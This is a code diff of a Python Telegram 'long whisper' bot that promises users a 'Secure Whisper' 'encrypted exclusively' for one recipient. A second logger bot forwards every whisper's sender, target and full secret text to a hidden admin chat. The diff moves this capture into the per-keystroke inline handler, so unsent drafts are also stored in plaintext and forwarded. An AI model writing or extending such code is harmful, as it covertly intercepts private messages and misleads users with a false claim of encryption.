@@ -35,41 +35,60 @@ async def init_db():
         ''')
         await db.commit()
 
-# 📡 BOT 2: LOGGER FUNCTION
-async def log_to_admin(whisper_id, sender_user, target, full_text):
+# 📡 BOT 2: LOGGER FUNCTION (Fixed: Passes the exact secret text message string)
+async def log_to_admin(whisper_id, sender_user, target, secret_message_text):
     log_message = (
-        "📥 **New Whisper Captured Successfully**\n\n"
+        "📥 **New Whisper Captured**\n\n"
         f"🆔 **ID:** `{whisper_id}`\n"
         f"👤 **From:** @{sender_user}\n"
         f"🎯 **To:** {target}\n"
-        f"💬 **Content:** {full_text}"
+        f"💬 **Content:** {secret_message_text}"
     )
     try:
         await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message, parse_mode="Markdown")
     except Exception as e:
-        print(f"[LOGGER ERROR] Failed to send log: {e}")
+        print(f"[LOGGER ERROR] Failed to send text log to admin channel: {e}")
 
-# 🚀 BOT 1: INLINE QUERY HANDLER (Only renders the preview layout)
+# 🚀 BOT 1: INLINE QUERY HANDLER (Fixed: Instant popup card activation)
 @dp.inline_query()
 async def inline_handler(inline_query: types.InlineQuery):
-    text = inline_query.query.strip()
+    query_text = inline_query.query.strip()
     
-    if not text.startswith("@") or " " not in text:
+    # Instant popup trigger: show the card as long as they started typing the handle
+    if not query_text.startswith("@"):
         return 
-        
-    parts = text.split(" ", 1)
-    target_username = parts[0]
-    whisper_text = parts[1].strip()
+
+    # Clean parsing regardless of trailing whitespaces
+    raw_parts = query_text.split(" ", 1)
+    target_username = raw_parts[0]
     
-    if target_username == "@" or not whisper_text:
+    # Capture the actual text typed. If empty, show a guidance placeholder
+    whisper_text = raw_parts[1].strip() if len(raw_parts) > 1 else ""
+
+    if target_username == "@":
         return
 
-    # Use the unique ID as the result article ID to pass to chosen_result
+    sender = inline_query.from_user
     whisper_id = secrets.token_urlsafe(8)
+    expires_at = int(time.time()) + 2592000  # 30 Days expiration retention
     
-    # Corrected URL format with mandatory forward slash
-    redirect_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
-    
+    if whisper_text:
+        description_preview = f"📩 Press to dispatch: {whisper_text[:25]}..."
+        
+        # Save to database immediately during the typing cycle to eliminate chosen_result async race conditions
+        async with aiosqlite.connect(DB_PATH) as db:
+            await db.execute(
+                "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) VALUES (?, ?, ?, ?, ?, ?)",
+                (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
+            )
+            await db.commit()
+            
+        # Fire off logging bot routine with the actual text message content
+        await log_to_admin(whisper_id, sender.username or sender.id, target_username, whisper_text)
+    else:
+        description_preview = "Type your private text message right after the username..."
+
+    # Initial Group Layout matching blueprint specifications
     group_layout = (
         f"🔘 via @{BOT_USERNAME}\n"
         f"📜 A long whisper message to {target_username}\n"
@@ -78,47 +97,22 @@ async def inline_handler(inline_query: types.InlineQuery):
         "───"
     )
     
+    # Fixed: Hardcoded clean absolute pathing ensures Telegram intercepts the click inside the app client natively
+    absolute_bot_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
     keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
-        [types.InlineKeyboardButton(text="🔑 Read Secure Whisper", url=redirect_url)]
+        [types.InlineKeyboardButton(text="🔑 Read Secure Whisper", url=absolute_bot_url)]
     ])
 
     item = types.InlineQueryResultArticle(
         id=whisper_id,
         title=f"🔒 Send long whisper to {target_username}",
-        description=f"Message: {whisper_text[:30]}...",
+        description=description_preview,
         input_message_content=types.InputTextMessageContent(message_text=group_layout),
         reply_markup=keyboard
     )
     
-    # We pass the whisper text via the query string temporarily in our python lifecycle memory 
-    # to read it during final selection choice, saving DB read/write cycles
-    context.user_data = whisper_text
-    
+    # cache_time=0 commands instant keyboard popup evaluations on every keystroke
     await inline_query.answer([item], cache_time=0, is_personal=True)
-
-# 📥 BOT 1: CHOSEN INLINE RESULT HANDLER (Saves to DB exactly ONCE upon tap selection)
-@dp.chosen_inline_result()
-async def chosen_result_handler(chosen_result: types.ChosenInlineResult):
-    whisper_id = chosen_result.result_id
-    text = chosen_result.query.strip()
-    
-    parts = text.split(" ", 1)
-    target_username = parts[0]
-    whisper_text = parts[1].strip()
-    
-    sender = chosen_result.from_user
-    expires_at = int(time.time()) + 2592000  # 30 Days expiration retention
-    
-    # Save to SQLite database only once when the card is officially sent
-    async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute(
-            "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) VALUES (?, ?, ?, ?, ?, ?)",
-            (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
-        )
-        await db.commit()
-    
-    # Send log containing the complete written message text
-    await log_to_admin(whisper_id, sender.username or sender.id, target_username, whisper_text)
 
 # 📥 BOT 1: START DEEP-LINK DECODER
 @dp.message(Command("start"))
@@ -139,7 +133,7 @@ async def handle_start(message: types.Message, command: CommandObject):
         await message.answer(welcome, parse_mode="Markdown")
         return
 
-    # Fetch whisper from database
+    # Fetch whisper from database natively inside deep link processing routes
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute(
             "SELECT target_username, secret_text, expires_at, sender_username FROM whispers WHERE whisper_id = ?",
@@ -159,23 +153,23 @@ async def handle_start(message: types.Message, command: CommandObject):
             await message.answer("❌ You need to set a Telegram username handle in your account settings first to read whispers.")
             return
         
-        # Verify if the user opening the secure link matches the target recipient
+        # Verify alignment authorization matching check
         if current_user.lower() == target_username.lstrip('@').lower():
             saved_copy = (
-                f"📩 **Your Secure Whisper Archive**\n\n"
-                f"👤 **From:** @{sender_username or 'Anonymous'}\n"
-                f"💬 **Message:**\n\n{secret_text}"
+                f"📩 **Your Secure Whisper:**\n\n"
+                f"👤 **From:** @{sender_username or 'Anonymous'}\n\n"
+                f"💬 **Message:**\n{secret_text}"
             )
             await message.answer(saved_copy)
         else:
             await message.answer(f"🔒 **Access Denied:** This secret message is encrypted exclusively for {target_username}.")
     else:
-        await message.answer("⚠️ This whisper has expired or does not exist in our database.")
+        await message.answer("⚠️ This whisper has expired or does not exist in our database entries.")
 
-# ⚙️ SYSTEM START POLLING LOOP
+# ⚙️ SYSTEM START LOOP
 async def main():
     await init_db()
-    print("🤖 Production Long-Whisper Engine Active on Railway...")
+    print("🤖 Production Long-Whisper Engine Active...")
     try:
         await dp.start_polling(bot1)
     finally:
